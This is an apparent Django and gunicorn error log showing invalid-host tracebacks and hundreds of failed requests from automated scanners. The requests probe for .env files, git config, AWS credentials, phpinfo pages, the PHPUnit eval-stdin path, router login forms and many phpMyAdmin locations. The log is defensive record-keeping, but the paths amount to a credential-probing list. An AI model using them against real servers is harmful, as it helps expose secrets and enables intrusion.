  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /libs/js/iframe.js
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /.env
Not Found: /robots.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.env
Not Found: /.env~
Not Found: /.env.bak
Not Found: /.env.backup
Not Found: /.env.example
Not Found: /local.env
Not Found: /backend/.env
Not Found: /.git/config
Not Found: /robots.txt
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /GponForm/diag_Form
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.env
Not Found: /asdf.php
Not Found: /pinfo.php
Not Found: /phpversion.php
Not Found: /old_phpinfo.php
Not Found: /infos.php
Not Found: /php-info.php
Not Found: /dashboard/phpinfo.php
Not Found: /phpinfo.php3
Not Found: /phpinfo.php4
Not Found: /phpinfo.php5
Not Found: /_profiler/phpinfo.php
Not Found: /laravel/core/.env
Not Found: /beta/.env
Not Found: /kyc/.env
Not Found: /prod/.env
Not Found: /api/.env
Not Found: /.docker/.env
Not Found: /app/.env
Not Found: /crm/.env
Not Found: /backend/.env
Not Found: /local/.env
Not Found: /application/.env
Not Found: /laravel/.env
Not Found: /shared/.env
Not Found: /.env.project
Not Found: /apps/.env
Not Found: /development/.env
Not Found: /_profiler/phpinfo
Not Found: /phpinfo.php
Not Found: /info.php
Not Found: /.env.bak
Not Found: /.env.config
Not Found: /.env.backup
Not Found: /.env.dist
Not Found: /.env.docker
Not Found: /.env.docker.dev
Not Found: /.env.example
Not Found: /.env.local
Not Found: /.env.sample
Not Found: /.env.save
Not Found: /.env.stage
Not Found: /.env.travis
Not Found: /.envrc
Not Found: /.envs
Not Found: /config/aws.yml
Not Found: /symfony/_profiler/phpinfo
Not Found: /phpinfo
Not Found: /login
Not Found: /.aws/credentials
Not Found: /config.js
Not Found: /config/config.json
Not Found: /index.php/phpinfo
Not Found: /application/config/constants.php
Not Found: /dev/phpinfo.php
Not Found: /php_info.php
Not Found: /install/index.php
Not Found: /config.php
Not Found: /php.php
Not Found: /config/app.php
Not Found: /.env.php
Not Found: /public/.env
Not Found: /content/.env
Not Found: /:80/.env
Not Found: /:443/.env
Not Found: /:432/.env
Not Found: /:8000/.env
Not Found: /:8080/.env
Not Found: /tool/view/phpinfo.view.php
Not Found: /debug/default/view
Not Found: /symfony/public/_profiler/phpinfo
Not Found: /symfony/public
Not Found: /api/config.js
Not Found: /config/environments/database.rb
Not Found: /appsettings.json
Not Found: /config.ini
Not Found: /config/settings.py
Not Found: /server/settings.py
Not Found: /storage/logs/laravel.log
Not Found: /Lara/.env
Not Found: /api/shared/config/config.env
Not Found: /api/shared/config.env
Not Found: /config.env
Not Found: /production/.env
Not Found: /dev/.env
Not Found: /api/shared/config/.env
Not Found: /api/shared/.env
Not Found: /api/config.env
Not Found: /old/.env
Not Found: /core/.env
Not Found: /server_info.php
Not Found: /admincontrol/sys_phpinfo.php
Not Found: /ads.txt
Not Found: /ads.txt
Not Found: /Public/admin/lib/webuploader/0.1.5/server/fileupload.php
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /youtube-video-downloader/contact.html/
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /wp-login.php
Not Found: /public/lib/webuploader/0.1.5/server/fileupload.php
Not Found: /.env
Not Found: /robots.txt
Not Found: /Public/webuploader/0.1.5/server/fileupload.php
Not Found: /.git/config
Not Found: /.env
Not Found: /.ENV
Not Found: /.Env
Not Found: /.AWS/credentials
Not Found: /.AWS/CREDENTIALS
Not Found: /.Aws/credentials
Not Found: /.CONFIG.yaml
Not Found: /.Config.yaml
Not Found: /.env.BAK
Not Found: /.ENV.example
Not Found: /.env.EXAMPLE
Not Found: /.ENV.EXAMPLE
Not Found: /ADMIN/.env
Not Found: /Admin/.env
Not Found: /Application/.env
Not Found: /APPLICATION/.env
Not Found: /BACKEND/.env
Not Found: /Config/.env
Not Found: /CONFIG/.env
Not Found: /Core/.env
Not Found: /CORE/.env
Not Found: /Cp/.env
Not Found: /CP/.env
Not Found: /Credentials
Not Found: /CREDENTIALS
Not Found: /Crm/.env
Not Found: /CRM/.env
Not Found: /Data/.env
Not Found: /DATA/.env
Not Found: /.git/HEAD
Not Found: /.env
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /libs/js/iframe.js
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /actuator/gateway/routes
Not Found: /robots.txt
Not Found: /public/static/lib/webuploader/0.1.5/server/fileupload.php
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Not Found: /public/static/admin/lib/webuploader/0.1.5/server/fileupload.php
Not Found: /contact.html
Not Found: /contact/contact.html
Not Found: /temp.php
Not Found: /temp.php
Not Found: /temp.php
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /GponForm/diag_Form
Not Found: /.env
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /.git/config
Not Found: /.git/refs/
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /boaform/admin/formLogin
Not Found: /robots.txt
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /lib/webuploader/0.1.5/server/fileupload.php
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /robots.txt
Not Found: /ads.txt
Not Found: /ads.txt
Not Found: /public/static/lib/webuploader/0.1.5/server/fileupload.php
Not Found: /manager/text/list
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Not Found: /.git/refs/heads/
Not Found: /robots.txt
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /.env
Not Found: /Demo/.env
Not Found: /DEMO/.env
Not Found: /Dev/.env
Not Found: /DEV/.env
Not Found: /Doc/.env
Not Found: /DOC/.env
Not Found: /Docs/.env
Not Found: /DOCS/.env
Not Found: /Download/.env
Not Found: /Env/.env
Not Found: /Html/.env
Not Found: /Inc/.env
Not Found: /Infos/
Not Found: /Lib/.env
Not Found: /Library/.env
Not Found: /Logging/.env
Not Found: /Media/.env
Not Found: /Misc/.env
Not Found: /New/.env
Not Found: /Phpinfo.php
Not Found: /PHPinfo.php
Not Found: /PHPINFO.php
Not Found: /Production/.env
Not Found: /Public/.env
Not Found: /Server/.env
Not Found: /Shared/.env
Not Found: /Site/.env
Not Found: /Stage/.env
Not Found: /Staging/.env
Not Found: /Upload/.env
Not Found: /Vendor/.env
Not Found: /Web/.env
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Not Found: /robots.txt
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /robots.txt
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /libs/js/iframe.js
Not Found: /public/lib/webuploader/0.1.5/server/fileupload.php
Not Found: /Public/admin/lib/webuploader/0.1.5/server/fileupload.php
Not Found: /wp-admin/
Not Found: /robots.txt
Not Found: /sitemap_index.xml
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Not Found: /sitemap_index.xml
Not Found: /wp-admin/
Not Found: /index.html
Not Found: /robots.txt
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /.env
Not Found: /wp-login.php
Not Found: /.git/refs/tags/
Not Found: /robots.txt
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /druid/index.html
Not Found: /temp.php
Not Found: /temp.php
Not Found: /temp.php
Not Found: /.env
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /cgi-bin/jarrewrite.sh
Not Found: /wp-admin/css/
Not Found: /.well-known/
Not Found: /sites/default/files/
Not Found: /uploads/
Not Found: /images/
Not Found: /files/
Not Found: /.env
Not Found: /.git/config
Not Found: /.env
Not Found: /robots.txt
Not Found: /robots.txt
Not Found: /lib/webuploader/0.1.5/server/fileupload.php
Not Found: /Public/webuploader/0.1.5/server/fileupload.php
Not Found: //pagead2.googlesyndication.com/pagead/js/adsbygoogle.js
Not Found: /robots.txt
Invalid HTTP_HOST header: '103.147.86.158:x'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '103.147.86.158:x'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /public/static/admin/lib/webuploader/0.1.5/server/fileupload.php
Not Found: /wp-conf.php
Not Found: /wp-admin/maint/index.php
Not Found: /.well-known/acme-challenge/index.php
Not Found: /wp-content/plugins/core-plugin/include.php
Not Found: /randkeyword.php
Not Found: /wp-content/index.php
Not Found: /404.php
Not Found: /wp-admin/network/index.php
Not Found: /.well-known/index.php
Not Found: /wp-login.php
Not Found: /plugin.php
Not Found: /install.php
Not Found: /function.php
Not Found: /wp-content/uploads/2023/05/404.php
Not Found: /ws.php
Not Found: /tiny.php
Not Found: /.well-known/about.php
Not Found: /autoload_classmap.php
Not Found: /dropdown.php
Not Found: /wp.php
Not Found: /wp-admin/includes/
Not Found: /.well-known/acme-challenge/
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /wp-login.php
Not Found: /wp-login.php
Not Found: /robots.txt
Not Found: /hello.world
Forbidden (CSRF cookie not set.): /
Not Found: /hudson
Not Found: /robots.txt
Not Found: /.well-known/security.txt
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /hello.world
Forbidden (CSRF cookie not set.): /
Not Found: /.git/config
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /administrator/admin/index.php
Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /administrator/pma/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /PMA/index.php
Not Found: /mysql/admin/index.php
Not Found: /sql/sql/index.php
Not Found: /db/webadmin/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /administrator/PMA/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /php-my-admin/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /db/websql/index.php
Not Found: /phpMyadmin/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /mysql/pMA/index.php
Not Found: /php-myadmin/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /db/webdb/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /mysql/pma/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /_phpmyadmin_/index.php
Not Found: /mysqladmin/index.php
Not Found: /mysqlmanager/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /phpmy-admin/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /program/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /db/db-admin/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /mysql/db/index.php
Not Found: /administrator/phpMyAdmin/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /db/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /dbadmin/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /phpmy/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /sql/webadmin/index.php
Not Found: /shopdb/index.php
Not Found: /myadmin/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /db/myadmin/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /sql/websql/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /sqlmanager/index.php
Not Found: /database/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /administrator/web/index.php
Not Found: /mysql-admin/index.php
Not Found: /sql/webdb/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /sql/phpmanager/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /administrator/db/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /phpmyadmin/index.php
Not Found: /mysql/index.php
Not Found: /MyAdmin/index.php
Not Found: /mysql/web/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /sql/myadmin/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /mysql/sqlmanager/index.php
Not Found: /db/dbadmin/index.php
Not Found: /phpMyAdmin2/index.php
